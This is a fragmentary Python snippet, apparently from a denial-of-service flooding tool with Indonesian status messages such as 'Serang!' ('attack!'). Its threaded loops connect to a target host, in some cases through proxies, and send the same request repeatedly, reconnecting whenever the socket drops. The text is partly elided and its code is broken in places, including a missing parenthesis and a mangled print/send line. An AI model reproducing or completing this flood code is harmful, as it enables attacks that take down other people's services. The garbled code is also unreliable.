	...
	def run(self): 
		...
		while True: 
			try:
				...
				print ("\033[92mn Paket Dikirmkan Dari \033[0m" + str(proxy[0]+":"+proxy[1]) + "\033[91mno Serang! \033[0m", self.counter)
				try: 
	...
	def run(self): 
		...
		while True:
			try:
				...
				s.send (str.encode(request)) 
				print ("\033[92mn Paket Dikirimkan Dari \033[0m" + str(proxy[0]+":"+proxy[1]) + "\033[91mno Serang! \033[0m", self.counter) # print req + counter
				try: 
					for y in range(multiple): 
						s.send(str.encode(request)) 
				except: 
				...
				try: 
					...
					s.connect((str(url2), int(urlport))) 
					s.send (str.encode(request))
					print ("\033[92mn Paket Dikirimkan Dari \033[0m" + str(proxy[0]+":"+proxy[1]) + "\033[91mno Serang! \033[0m", self.counter) 
					try: 
						for y in range(multiple): 
							s.send(str.encode(request))
					except: 
					...
					print ("\033[91mno SockDown. Mencoba mengirim ulang \033[0m", self.counter)
					s.close() 
	...
	def run(self): 
		...
		while True:
			try:
				...
				s.connect((str(url2), int(urlport))) 
				s.send (str.encode(request)
				print ("Request sent! @", self.counter)s.send() 
				try: 
					for y in range(multiple): 
						s.send(str.encode(request)) 
				except: 
